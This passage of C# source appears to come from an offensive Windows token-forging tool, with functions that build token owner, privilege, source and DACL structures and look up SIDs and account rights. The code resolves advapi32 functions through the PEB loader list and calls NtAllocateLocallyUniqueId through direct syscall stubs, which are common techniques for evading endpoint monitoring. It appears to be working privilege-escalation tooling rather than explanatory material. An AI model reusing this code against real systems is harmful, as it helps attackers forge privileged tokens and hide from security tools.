            tokenPrivileges = new Winnt._TOKEN_PRIVILEGES_ARRAY()
            {
                PrivilegeCount = (uint)rights.Keys.Count,
                Privileges = new Winnt._LUID_AND_ATTRIBUTES[35]
            };

            int j = 0;
            foreach (string priv in rights.Keys)
            {
                tokenPrivileges.Privileges[j].Luid = rights[priv];
                tokenPrivileges.Privileges[j].Attributes = Winnt.SE_PRIVILEGE_ENABLED;
                j++;
            }

            Marshal.FreeHGlobal(hPolicyHandle);

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Creates the TOKEN_OWNER Structure
        /// No Conversions Required
        /// </summary>
        /// <param name="domain"></param>
        /// <param name="userName"></param>
        /// <param name="tokenOwner"></param>
        /// <returns></returns>
        ////////////////////////////////////////////////////////////////////////////////
        private bool CreateTokenOwner(string domain, string userName, out Ntifs._TOKEN_OWNER tokenOwner)
        {
            Console.WriteLine("[*] _TOKEN_OWNER");
            tokenOwner = new Ntifs._TOKEN_OWNER();
            IntPtr hOwnerSid = IntPtr.Zero;
            if (!_LookupSid(domain, userName, ref hOwnerSid))
            {
                return false;
            }
            tokenOwner.Owner = hOwnerSid;

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Creates the TOKEN_PRIMARY_GROUP Structure
        /// No Conversions Required
        /// Not Currently Used
        /// </summary>
        /// <param name="firstLocalgroupUserInfo"></param>
        /// <param name="tokenPrimaryGroup"></param>
        /// <returns></returns>
        ////////////////////////////////////////////////////////////////////////////////
        private bool CreateTokenPrimaryGroup(string firstLocalgroupUserInfo, out Winnt._TOKEN_PRIMARY_GROUP tokenPrimaryGroup)
        {
            Console.WriteLine("_TOKEN_PRIMARY_GROUP");
            tokenPrimaryGroup = new Winnt._TOKEN_PRIMARY_GROUP()
            {
                PrimaryGroup = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)))
            };

            if (!string.IsNullOrEmpty(firstLocalgroupUserInfo))
            {
                IntPtr hSid = IntPtr.Zero;
                _LookupSid(null, firstLocalgroupUserInfo, ref hSid);
                tokenPrimaryGroup = (Winnt._TOKEN_PRIMARY_GROUP)Marshal.PtrToStructure(hSid, typeof(Winnt._TOKEN_PRIMARY_GROUP));
            }

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Creates the TOKEN_DEFAULT_DACL Structure
        /// No Conversions Required
        /// </summary>
        /// <param name="tokenDefaultDacl"></param>
        /// <returns></returns>
        ////////////////////////////////////////////////////////////////////////////////
        private bool CreateTokenDefaultDACL(out Winnt._TOKEN_DEFAULT_DACL tokenDefaultDacl)
        {
            Console.WriteLine("[*] _TOKEN_DEFAULT_DACL");
            tokenDefaultDacl = new Winnt._TOKEN_DEFAULT_DACL()
            {
                DefaultDacl = IntPtr.Zero
            };

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Creates the TOKEN_SOURCE Structure
        /// Converted to D/Invoke Syscalls
        /// <param name="tokenSource"></param>
        /// <returns></returns>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        private bool CreateTokenSource(out Winnt._TOKEN_SOURCE tokenSource)
        {
            Console.WriteLine("[*] _TOKEN_SOURCE");
            tokenSource = new Winnt._TOKEN_SOURCE();

            IntPtr hNtAllocateLocallyUniqueId = Generic.GetSyscallStub("NtAllocateLocallyUniqueId");
            MonkeyWorks.ntdll.NtAllocateLocallyUniqueId fSyscallNtAllocateLocallyUniqueId = (MonkeyWorks.ntdll.NtAllocateLocallyUniqueId)Marshal.GetDelegateForFunctionPointer(hNtAllocateLocallyUniqueId, typeof(MonkeyWorks.ntdll.NtAllocateLocallyUniqueId));

            uint ntRetVal = 0;
            try
            {
                ntRetVal = fSyscallNtAllocateLocallyUniqueId(ref tokenSource.SourceIdentifier);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] NtAllocateLocallyUniqueId Generated an Exception");
                Console.WriteLine("[-] {0}", ex.Message);
                return false;
            }

            if (0 != ntRetVal)
            {
                Misc.GetNtError("NtAllocateLocallyUniqueId", ntRetVal);
                return false;
            }

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Looks up the right/privileges assigned to a user / group based on a policy
        /// Converted to D/Invoke GetPebLdrModuleEntry/GetExportAddress
        /// </summary>
        /// <param name="hPolicyHandle"></param>
        /// <param name="sid"></param>
        /// <param name="rights"></param>
        /// <returns></returns>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        private static bool _LookupRights(IntPtr hPolicyHandle, IntPtr sid, ref Dictionary<string, Winnt._LUID> rights)
        {
            IntPtr hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");

            ////////////////////////////////////////////////////////////////////////////////
            // advapi32.LsaEnumerateAccountRights(hPolicyHandle, sid, out hUserRights, out countOfRights);
            ////////////////////////////////////////////////////////////////////////////////
            IntPtr hLsaEnumerateAccountRights = Generic.GetExportAddress(hadvapi32, "LsaEnumerateAccountRights");
            MonkeyWorks.advapi32.LsaEnumerateAccountRights fLsaEnumerateAccountRights = (MonkeyWorks.advapi32.LsaEnumerateAccountRights)Marshal.GetDelegateForFunctionPointer(hLsaEnumerateAccountRights, typeof(MonkeyWorks.advapi32.LsaEnumerateAccountRights));

            IntPtr hUserRights;
            long countOfRights;

            uint ntRetVal = 0;
            try
            {
                ntRetVal = fLsaEnumerateAccountRights(hPolicyHandle, sid, out hUserRights, out countOfRights);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] LsaEnumerateAccountRights Generated an Exception");
                Console.WriteLine("[-] {0}", ex.Message);
                return false;
            }

            //Weird Quirk
            countOfRights--;

            if (0 != ntRetVal)
            {
                //File Not Found - User Has No Rights Assigned
                //Parameter is incorrect - Not a valid SID lookup
                if (3221225524 == ntRetVal || 3221225485 == ntRetVal)
                {
                    return true;
                }

                Misc.GetLsaNtError("LsaEnumerateAccountRights", ntRetVal);
                return false;
            }

            Console.WriteLine("[+] Additional {0} privilege(s)", countOfRights);

            ntsecapi._LSA_UNICODE_STRING[] userRights = new ntsecapi._LSA_UNICODE_STRING[countOfRights];

            ////////////////////////////////////////////////////////////////////////////////
            // advapi32.LookupPrivilegeValue(null, privilege, ref luid);
            ////////////////////////////////////////////////////////////////////////////////
            IntPtr hLookupPrivilegeValueW = Generic.GetExportAddress(hadvapi32, "LookupPrivilegeValueW");
            MonkeyWorks.advapi32.LookupPrivilegeValueW fLookupPrivilegeValueW = (MonkeyWorks.advapi32.LookupPrivilegeValueW)Marshal.GetDelegateForFunctionPointer(hLookupPrivilegeValueW, typeof(MonkeyWorks.advapi32.LookupPrivilegeValueW));

            for (int i = 0; i < countOfRights; i++)
            {
                string privilege;
                try
                {
                    userRights[i] = (ntsecapi._LSA_UNICODE_STRING)Marshal.PtrToStructure(new IntPtr(hUserRights.ToInt64() + (i * Marshal.SizeOf(typeof(ntsecapi._LSA_UNICODE_STRING)))), typeof(ntsecapi._LSA_UNICODE_STRING));
                    privilege = Marshal.PtrToStringUni(userRights[i].Buffer);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] PtrToStructure Generated an Exception");
                    Console.WriteLine("[-] {0}", ex.Message);
                    continue;
                }

                Winnt._LUID luid = new Winnt._LUID();
                bool retVal = false;
                try
                {
                    retVal = fLookupPrivilegeValueW(null, privilege, ref luid);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] LookupPrivilegeValueW Generated an Exception");
                    Console.WriteLine("[-] {0}", ex.Message);
                    continue;
                }

                if (!retVal)
                {
                    Console.WriteLine("[-] Privilege Not Found");
                    continue;
                }
                Console.WriteLine(" ({0}) {1}", i, privilege);
                rights[privilege] = luid;


            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Currently unused but useful for debugging
        /// Converted to D/Invoke GetPebLdrModuleEntry/GetExportAddress
        /// </summary>
        /// <param name="hSid"></param>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        private static string _PrintStringSID(IntPtr hSid)
        {
            IntPtr hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");
            IntPtr hConvertSidToStringSidW = Generic.GetExportAddress(hadvapi32, "ConvertSidToStringSidW");
            MonkeyWorks.advapi32.ConvertSidToStringSidW fConvertSidToStringSidW = (MonkeyWorks.advapi32.ConvertSidToStringSidW)Marshal.GetDelegateForFunctionPointer(hConvertSidToStringSidW, typeof(MonkeyWorks.advapi32.ConvertSidToStringSidW));

            IntPtr hStringUserSid = IntPtr.Zero;
            try
            {
                Ntifs._SID sid = (Ntifs._SID)Marshal.PtrToStructure(hSid, typeof(Ntifs._SID));
                fConvertSidToStringSidW(ref sid, ref hStringUserSid);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] ConvertSidToStringSidW Generated an Exception");
                Console.WriteLine("[-] {0}", ex.Message);
                return string.Empty;
            }

            return Marshal.PtrToStringUni(hStringUserSid);
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// SID Lookup Wrapper
        /// Converted to D/Invoke GetPebLdrModuleEntry/GetExportAddress
        /// </summary>
        /// <param name="logonDomain"></param>
        /// <param name="userName"></param>
        /// <param name="hSid"></param>
        /// <returns></returns>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        private static bool _LookupSid(string logonDomain, string userName, ref IntPtr hSid)
        {
            IntPtr hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");

            ////////////////////////////////////////////////////////////////////////////////
            //advapi32.LookupAccountName(lpSystemName, lpAccountName, hSid, ref cbSid, lpReferencedDomainName, ref cchReferencedDomainName, out peUse);
            ////////////////////////////////////////////////////////////////////////////////
            IntPtr hLookupAccountNameW = Generic.GetExportAddress(hadvapi32, "LookupAccountNameW");
            MonkeyWorks.advapi32.LookupAccountNameW fLookupAccountNameW = (MonkeyWorks.advapi32.LookupAccountNameW)Marshal.GetDelegateForFunctionPointer(hLookupAccountNameW, typeof(MonkeyWorks.advapi32.LookupAccountNameW));

            StringBuilder lpSystemName = new StringBuilder(logonDomain);
            StringBuilder lpAccountName = new StringBuilder(userName);
            uint cbSid = 0;
            StringBuilder lpReferencedDomainName = new StringBuilder();
            uint cchReferencedDomainName = 0;
            Winnt._SID_NAME_USE peUse = new Winnt._SID_NAME_USE();

            try
            {
                fLookupAccountNameW(
                    lpSystemName,
                    lpAccountName,
                    hSid,
                    ref cbSid,
                    lpReferencedDomainName,
                    ref cchReferencedDomainName,
                    out peUse
                );
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] LookupAccountNameW Generated an Exception");
                Console.WriteLine("[-] {0}", ex.Message);
            }

            hSid = Marshal.AllocHGlobal((int)cbSid);
            lpReferencedDomainName.EnsureCapacity((int)cchReferencedDomainName);

            bool retVal = false;
            try
            {
                retVal = fLookupAccountNameW(
                    lpSystemName,
                    lpAccountName,
                    hSid,
                    ref cbSid,
                    lpReferencedDomainName,
                    ref cchReferencedDomainName,
                    out peUse
                );
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] LookupAccountNameW Generated an Exception");
                Console.WriteLine("[-] {0}", ex.Message);
                Marshal.FreeHGlobal(hSid);
                return false;
            }

            if (!retVal)
            {
                Misc.GetWin32Error("LookupAccountName");
                return false;
            }

            string sddl = _PrintStringSID(hSid);
            /*
            ///////////////////////////////////////////////////////////////////////////////
            //advapi32.ConvertSidToStringSid(hSid, ref hStringUserSid);
            ///////////////////////////////////////////////////////////////////////////////
            IntPtr hConvertSidToStringSidW = Generic.GetExportAddress(hadvapi32, "ConvertSidToStringSidW");
            MonkeyWorks.advapi32.ConvertSidToStringSidW fConvertSidToStringSidW = (MonkeyWorks.advapi32.ConvertSidToStringSidW)Marshal.GetDelegateForFunctionPointer(hConvertSidToStringSidW, typeof(MonkeyWorks.advapi32.ConvertSidToStringSidW));

            IntPtr hStringUserSid = IntPtr.Zero;

            try
            {
                fConvertSidToStringSidW(ref hSid, ref hStringUserSid);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] LookupAccountNameW Generated an Exception");
                Console.WriteLine("[-] {0}", ex.Message);
            }
            string sddl = Marshal.PtrToStringAuto(hStringUserSid);
            
            */
            Console.WriteLine(" [+] {0} {1}", sddl, lpAccountName.ToString());

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Wrapper for AllocateAndInitializeSid - Hardest Possible way of doing it
        /// Converted to D/Invoke GetPebLdrModuleEntry/GetExportAddress
        /// </summary>
        /// <param name="authority"></param>
        /// <param name="subAuthority"></param>
        /// <param name="psid"></param>
        /// <returns></returns>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        private static bool InitializeSid(Winnt._SID_IDENTIFIER_AUTHORITY authority, uint[] subAuthority, ref IntPtr psid)
        {
            IntPtr hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");

            ////////////////////////////////////////////////////////////////////////////////
            // fAllocateAndInitializeSid(ref authority, 1, subAuthority[0], subAuthority[1], subAuthority[2], subAuthority[3], subAuthority[4], subAuthority[5], subAuthority[6], subAuthority[7], out psid);
            ////////////////////////////////////////////////////////////////////////////////
            IntPtr hAllocateAndInitializeSid = Generic.GetExportAddress(hadvapi32, "AllocateAndInitializeSid");
            MonkeyWorks.advapi32.AllocateAndInitializeSid fAllocateAndInitializeSid = (MonkeyWorks.advapi32.AllocateAndInitializeSid)Marshal.GetDelegateForFunctionPointer(hAllocateAndInitializeSid, typeof(MonkeyWorks.advapi32.AllocateAndInitializeSid));

            bool retVal = false;
            try
            {
                retVal = fAllocateAndInitializeSid(
                    ref authority,
                    1,
                    subAuthority[0],
                    subAuthority[1],
                    subAuthority[2],
                    subAuthority[3],
                    subAuthority[4],
                    subAuthority[5],
                    subAuthority[6],
                    subAuthority[7],
                    out psid
                );
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] AllocateAndInitializeSid Generated an Exception");
                Console.WriteLine("[-] {0}", ex.Message);
                return false;
            }

            if (!retVal)
            {
                Misc.GetWin32Error("AllocateAndInitializeSid");
                return false;
            }

            ////////////////////////////////////////////////////////////////////////////////
            // advapi32.ConvertSidToStringSid(psid, ref hStringUserSid);
            ////////////////////////////////////////////////////////////////////////////////
            string sddl = _PrintStringSID(psid);

            string accountName = string.Empty;
            try
            {
                accountName = new SecurityIdentifier(sddl).Translate(typeof(NTAccount)).ToString();
            }
            catch (IdentityNotMappedException ex)
            {
                Console.WriteLine("[-] SecurityIdentifier.Translate Generated an Exception");
                Console.WriteLine("[-] {0}", ex.Message);
            }

            Console.WriteLine("   - " + accountName + " " + sddl);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Wrapper for AllocateAndInitializeSid
        /// Converted to D/Invoke GetPebLdrModuleEntry/GetExportAddress
        /// </summary>
        /// <param name="sddl"></param>
        /// <param name="psid"></param>
        /// <returns></returns>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        public static bool InitializeSid(string sddl, ref IntPtr psid)
        {
            IntPtr hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");

            ////////////////////////////////////////////////////////////////////////////////
            // bool retVal = advapi32.ConvertStringSidToSidW(sddl, ref psid);
            ////////////////////////////////////////////////////////////////////////////////
            IntPtr hConvertStringSidToSidW = Generic.GetExportAddress(hadvapi32, "ConvertStringSidToSidW");
            MonkeyWorks.advapi32.ConvertStringSidToSidW fConvertStringSidToSidW = (MonkeyWorks.advapi32.ConvertStringSidToSidW)Marshal.GetDelegateForFunctionPointer(hConvertStringSidToSidW, typeof(MonkeyWorks.advapi32.ConvertStringSidToSidW));

            bool retVal = false;
            try
            {
                retVal = fConvertStringSidToSidW(sddl, ref psid);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] ConvertStringSidToSidW Generated an Exception");
                Console.WriteLine("[-] {0}", ex.Message);
                return false;
            }

            if (!retVal)
            {
                Misc.GetWin32Error("ConvertStringSidToSidW");
                return false;
            }

            string accountName = string.Empty;
            try
            {
                accountName = new SecurityIdentifier(sddl).Translate(typeof(NTAccount)).ToString();
            }
            catch (IdentityNotMappedException ex)
            {
                Console.WriteLine("[-] SecurityIdentifier.Translate Generated an Exception");
                Console.WriteLine("[-] {0}", ex.Message);
            }

            Console.WriteLine(" [+] {0,-20} {1}", sddl, accountName);
            return true;
        }
    }
}
